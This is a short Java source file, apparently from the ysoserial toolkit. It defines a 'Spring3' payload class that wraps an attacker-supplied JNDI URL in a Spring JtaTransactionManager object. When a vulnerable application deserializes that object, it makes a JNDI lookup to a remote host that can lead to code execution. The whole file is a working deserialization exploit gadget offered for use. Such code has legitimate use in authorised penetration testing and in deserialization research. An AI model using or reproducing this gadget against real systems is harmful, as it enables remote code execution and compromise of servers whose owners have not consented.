package ysoserial.payloads;

import org.springframework.transaction.jta.JtaTransactionManager;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;

@Authors({ Authors.MBECHLER })
@Dependencies({"org.springframework:spring-tx:5.2.3.RELEASE", "org.springframework:spring-context:5.2.3.RELEASE", "javax.transaction:javax.transaction-api:1.2"})
public class Spring3 implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {
		String jndiURL = null;
		if (command.toLowerCase().startsWith("jndi:")) {
			jndiURL = command.substring(5);
		} else {
			throw new Exception(String.format("Command [%s] not supported", command));
		}

		JtaTransactionManager manager = new JtaTransactionManager();
		manager.setUserTransactionName(jndiURL);
		return manager;
	}
}
